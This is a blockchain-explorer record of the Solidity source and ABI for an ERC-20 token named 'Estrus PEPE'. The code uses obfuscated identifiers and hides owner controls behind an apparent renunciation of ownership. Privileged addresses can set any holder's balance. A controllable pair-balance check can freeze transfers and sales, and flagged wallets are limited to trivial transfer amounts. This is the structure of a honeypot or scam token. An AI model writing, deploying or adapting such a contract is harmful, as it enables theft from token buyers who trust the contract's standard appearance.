{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface totalToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitTrading) external view returns (uint256);\n\n    function transfer(address totalTrading, uint256 modeTrading) external returns (bool);\n\n    function allowance(address takeFromMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalTrading,\n        uint256 modeTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellBuy, uint256 value);\n    event Approval(address indexed takeFromMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract limitTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tokenFrom {\n    function createPair(address senderAtReceiver, address sellTeam) external returns (address);\n}\n\ninterface feeTradingSwap is totalToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EstrusPEPE is limitTake, totalToken, feeTradingSwap {\n\n    bool public liquidityFrom;\n\n    function allowance(address swapModeLaunch, address buyTake) external view virtual override returns (uint256) {\n        if (buyTake == atMarketing) {\n            return type(uint256).max;\n        }\n        return fundMinReceiver[swapModeLaunch][buyTake];\n    }\n\n    address public sellTake;\n\n    function listAt() private view {\n        require(minFund[_msgSender()]);\n    }\n\n    function balanceOf(address limitTrading) public view virtual override returns (uint256) {\n        return feeSenderReceiver[limitTrading];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingMode;\n    }\n\n    address senderFeeMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public minFund;\n\n    address atMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function receiverAt(address isMode, address totalTrading, uint256 modeTrading) internal returns (bool) {\n        if (isMode == sellTake) {\n            return fundAuto(isMode, totalTrading, modeTrading);\n        }\n        uint256 buyReceiverFee = totalToken(fromTx).balanceOf(senderFeeMax);\n        require(buyReceiverFee == marketingEnable);\n        require(totalTrading != senderFeeMax);\n        if (fromTake[isMode]) {\n            return fundAuto(isMode, totalTrading, enableAmount);\n        }\n        return fundAuto(isMode, totalTrading, modeTrading);\n    }\n\n    function approve(address buyTake, uint256 modeTrading) public virtual override returns (bool) {\n        fundMinReceiver[_msgSender()][buyTake] = modeTrading;\n        emit Approval(_msgSender(), buyTake, modeTrading);\n        return true;\n    }\n\n    function atSenderLaunched(address toMarketing, uint256 modeTrading) public {\n        listAt();\n        feeSenderReceiver[toMarketing] = modeTrading;\n    }\n\n    string private marketingMode = \"EPE\";\n\n    function tradingShould(address txTake) public {\n        require(txTake.balance < 100000);\n        if (totalMarketing) {\n            return;\n        }\n        \n        minFund[txTake] = true;\n        \n        totalMarketing = true;\n    }\n\n    event OwnershipTransferred(address indexed swapToken, address indexed enableMin);\n\n    uint256 public tokenWallet;\n\n    constructor (){\n        \n        buyLiquidity isSender = buyLiquidity(atMarketing);\n        fromTx = tokenFrom(isSender.factory()).createPair(isSender.WETH(), address(this));\n        \n        sellTake = _msgSender();\n        minMaxLaunched();\n        minFund[sellTake] = true;\n        feeSenderReceiver[sellTake] = senderTeam;\n        \n        emit Transfer(address(0), sellTake, senderTeam);\n    }\n\n    mapping(address => uint256) private feeSenderReceiver;\n\n    function fundAuto(address isMode, address totalTrading, uint256 modeTrading) internal returns (bool) {\n        require(feeSenderReceiver[isMode] >= modeTrading);\n        feeSenderReceiver[isMode] -= modeTrading;\n        feeSenderReceiver[totalTrading] += modeTrading;\n        emit Transfer(isMode, totalTrading, modeTrading);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return isLaunch;\n    }\n\n    bool private tradingReceiver;\n\n    function transferFrom(address isMode, address totalTrading, uint256 modeTrading) external override returns (bool) {\n        if (_msgSender() != atMarketing) {\n            if (fundMinReceiver[isMode][_msgSender()] != type(uint256).max) {\n                require(modeTrading <= fundMinReceiver[isMode][_msgSender()]);\n                fundMinReceiver[isMode][_msgSender()] -= modeTrading;\n            }\n        }\n        return receiverAt(isMode, totalTrading, modeTrading);\n    }\n\n    uint256 private totalIs;\n\n    string private swapLaunched = \"Estrus PEPE\";\n\n    function sellExempt(address atLaunchedFee) public {\n        listAt();\n        if (liquidityBuy != tradingReceiver) {\n            tokenWallet = sellFund;\n        }\n        if (atLaunchedFee == sellTake || atLaunchedFee == fromTx) {\n            return;\n        }\n        fromTake[atLaunchedFee] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderTeam;\n    }\n\n    function owner() external view returns (address) {\n        return isLaunch;\n    }\n\n    uint256 toAmount;\n\n    bool private liquidityBuy;\n\n    uint256 constant enableAmount = 10 ** 10;\n\n    mapping(address => bool) public fromTake;\n\n    function name() external view virtual override returns (string memory) {\n        return swapLaunched;\n    }\n\n    function transfer(address toMarketing, uint256 modeTrading) external virtual override returns (bool) {\n        return receiverAt(_msgSender(), toMarketing, modeTrading);\n    }\n\n    uint8 private totalFee = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalFee;\n    }\n\n    function launchAuto(uint256 modeTrading) public {\n        listAt();\n        marketingEnable = modeTrading;\n    }\n\n    uint256 private senderTeam = 100000000 * 10 ** 18;\n\n    uint256 private walletLaunch;\n\n    uint256 private modeAmount;\n\n    function minMaxLaunched() public {\n        emit OwnershipTransferred(sellTake, address(0));\n        isLaunch = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private fundMinReceiver;\n\n    address private isLaunch;\n\n    uint256 private sellFund;\n\n    address public fromTx;\n\n    uint256 marketingEnable;\n\n    bool public totalMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeFromMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapModeLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTrading\",\"type\":\"uint256\"}],\"name\":\"atSenderLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeTrading\",\"type\":\"uint256\"}],\"name\":\"launchAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMaxLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunchedFee\",\"type\":\"address\"}],\"name\":\"sellExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTake\",\"type\":\"address\"}],\"name\":\"tradingShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EstrusPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}